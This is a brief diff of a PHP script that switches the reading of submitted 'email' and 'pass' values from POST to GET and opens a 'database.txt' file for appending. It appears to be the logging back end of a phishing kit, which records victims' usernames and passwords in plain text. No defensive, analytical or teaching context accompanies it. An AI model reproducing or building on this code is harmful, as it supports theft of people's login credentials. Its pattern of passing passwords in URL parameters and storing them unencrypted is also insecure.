@@ -1,8 +1,8 @@
 <?PHP
 
-$Log = $_POST['email'];
+$Log = $_GET['email'];
 
-$Pass = $_POST['pass'];
+$Pass = $_GET['pass'];
 
 $log = fopen("database.txt","at");
 
